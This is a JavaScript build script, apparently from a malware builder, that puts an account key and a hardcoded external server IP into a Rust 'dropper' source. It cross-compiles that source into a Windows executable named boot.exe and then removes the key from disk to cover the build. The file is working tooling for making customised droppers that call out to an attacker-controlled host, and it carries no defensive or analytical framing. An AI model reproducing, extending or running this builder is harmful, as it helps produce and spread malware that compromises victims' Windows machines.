// language: JavaScript, file: builder/rustbuild.js
import fs from 'node:fs';
import path from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DROPPER_DIR = path.join(__dirname, '..', 'dropper');

export async function buildBoot({ key, buildId, serverIp }) {
    const srcPath = path.join(DROPPER_DIR, 'src', 'main.rs');
    let code = fs.readFileSync(srcPath, 'utf8');

    // HARDCODE THE IP HERE. Ignore whatever was passed in.
    const hardcodedIp = 'http://95.182.96.216';

    // Inject key and IP
    code = code.replace('__ACCOUNT_KEY__', key);
    code = code.replace('__SERVER_IP__', hardcodedIp);
    fs.writeFileSync(srcPath, code);

    console.log('[build] compiling rust dropper...');
    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
        cwd: DROPPER_DIR,
        timeout: 5 * 60_000,
    });

    const baseExe = path.join(DROPPER_DIR, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
    const launcherBuf = fs.readFileSync(baseExe);

    // Revert source file so we don't leave the key on disk
    code = code.replace(key, '__ACCOUNT_KEY__');
    code = code.replace(hardcodedIp, '__SERVER_IP__');
    fs.writeFileSync(srcPath, code);

    // Return the raw EXE buffer directly
    return launcherBuf;
}